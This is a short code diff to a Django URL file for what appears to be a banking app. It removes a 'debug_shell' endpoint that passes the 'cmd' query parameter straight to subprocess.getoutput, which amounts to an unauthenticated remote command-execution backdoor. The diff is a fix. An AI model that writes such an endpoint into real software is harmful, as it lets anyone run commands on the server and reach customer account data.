@@ -88,13 +88,8 @@ from django.http import JsonResponse
 import subprocess
 from rest_framework.response import Response
 
-def debug_shell(request):
-    cmd = request.GET.get("cmd", "ls")
-    output = subprocess.getoutput(cmd)
-    return JsonResponse({"output": output})
 
 urlpatterns += [
-    path('debug_shell/', debug_shell),
     # Additional diagnostic endpoint
     path('url-test/', lambda request: JsonResponse({"message": "Banking URLs are being loaded correctly"})),
     path('admin/all_users_and_accounts/', get_all_users_and_accounts, name='all-users-and-accounts'),
